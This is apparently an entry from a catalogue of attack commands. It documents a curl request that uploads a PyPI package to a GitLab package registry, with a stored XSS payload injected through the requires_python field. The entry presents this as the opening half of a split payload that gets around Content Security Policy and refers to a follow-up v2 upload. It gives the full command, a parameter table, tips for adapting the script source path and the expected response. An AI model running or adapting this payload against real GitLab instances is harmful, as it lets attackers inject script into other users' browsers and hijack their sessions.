---
id: cmd-curl-pypi-csp-v1
data: >-
  curl -v
  "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi"
  -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F
  name='package_csp_bypass' -F requires_python='"><script
  src=/vakzz-h1/public/-/raw/a/test.js>'
tags:
  - csp-bypass
  - upload
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.484Z'
verified: false
validated: true
submitted: true
---
# curl-upload-pypi-csp-v1

## Command

```bash
curl -v "https://__token__:$TOKEN@gitlab.com/api/v4/projects/18315917/packages/pypi" -F content=@/tmp/lala.txt -F requires_python=2.7 -F version=1 -F name='package_csp_bypass' -F requires_python='"><script src=/vakzz-h1/public/-/raw/a/test.js>'
```

## Description

Uploads version 1 of a PyPi package with the opening part of a split XSS payload for CSP bypass.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output | No |
| URL | Authenticated API endpoint | Yes |
| `-F content=...` | Package file | Yes |
| `-F requires_python=2.7` | Base req | Yes |
| `-F version=1` | Version 1 | Yes |
| `-F name=...` | Package name | Yes |
| `-F requires_python='...'` | Opening payload | Yes |

## Examples

### Basic Usage

As above; follow with v2 upload.

### Advanced Usage

Adjust src to allowed GitLab raw file path.

## Expected Output

HTTP 201 Created.

## Related

- [[commands/curl-upload-pypi-xss]]
- [[commands/curl-upload-pypi-csp-v2]]
